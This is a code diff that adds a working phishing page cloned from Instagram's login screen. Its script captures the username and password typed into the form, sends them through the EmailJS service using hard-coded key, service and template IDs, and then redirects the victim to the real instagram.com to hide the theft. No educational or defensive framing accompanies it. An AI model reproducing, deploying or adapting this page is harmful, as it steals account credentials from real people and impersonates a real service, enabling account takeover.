@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+   <script>
+    (function(){
+      emailjs.init("R8vashMmVD4bmp4nI"); // ✅ Your Public Key
+    })();
+  </script>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+      background-color: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .main {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      max-width: 350px;
+      padding: 20px;
+    }
+
+    .box {
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      width: 100%;
+      padding: 40px 40px 20px;
+      text-align: center;
+    }
+
+    .box img.logo {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+
+    .box input {
+      width: 100%;
+      padding: 9px;
+      margin: 5px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background-color: #fafafa;
+      font-size: 12px;
+    }
+
+    .login-btn {
+      margin-top: 10px;
+      width: 100%;
+      padding: 8px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .or-line {
+      display: flex;
+      align-items: center;
+      margin: 15px 0;
+    }
+
+    .or-line::before, .or-line::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+
+    .or-line span {
+      margin: 0 10px;
+      font-size: 13px;
+      color: #8e8e8e;
+      font-weight: bold;
+    }
+
+    .facebook-login {
+      color: #385185;
+      font-weight: bold;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .forgot {
+      margin-top: 12px;
+      font-size: 12px;
+      color: #00376b;
+      text-decoration: none;
+    }
+
+    .signup-box {
+      margin-top: 10px;
+      width: 100%;
+      padding: 20px;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .app-links {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #262626;
+    }
+
+    .app-icons img {
+      width: 136px;
+      margin: 10px 5px 0;
+    }
+
+    @media (max-width: 500px) {
+      .box, .signup-box {
+        border: none;
+        padding: 20px 10px;
+      }
+
+      .main {
+        padding: 0 15px;
+      }
+
+      .app-icons img {
+        width: 120px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main">
+    <div class="box">
+    <form action="submit" id="box">
+      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo" />
+      <input type="text" name="email" placeholder="Phone number, username, or email" />
+      <input type="password" name="password" placeholder="Password" />
+      <button type="submit" class="login-btn">Log In</button>
+      <div class="or-line"><span>OR</span></div>
+      <a href="#" class="facebook-login">Log in with Facebook</a>
+      <a href="#" class="forgot">Forgot password?</a>
+    </form>
+    </div>
+
+    <div class="signup-box">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="app-links">
+      Get the app.
+      <div class="app-icons">
+        <img src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg" alt="App Store" style="height: 40px;" />
+<img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" style="height: 40px;" />
+
+      </div>
+    </div>
+  </div>
+   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+  <!-- ✅ Then run your JS -->
+  <script>
+    // Wait until library loads fully
+    window.onload = function () {
+      emailjs.init("R8vashMmVD4bmp4nI"); // Your public key
+
+      document.getElementById("box").addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        emailjs.sendForm("service_jgthnxj", "template_r7wf0g6", this)
+          .then(() => {
+            window.location.href = "https://instagram.com";
+            this.reset();
+          }, (err) => {
+            console.log(err)
+          });
+      });
+    };
+  </script>
+</body>
+</html>
+
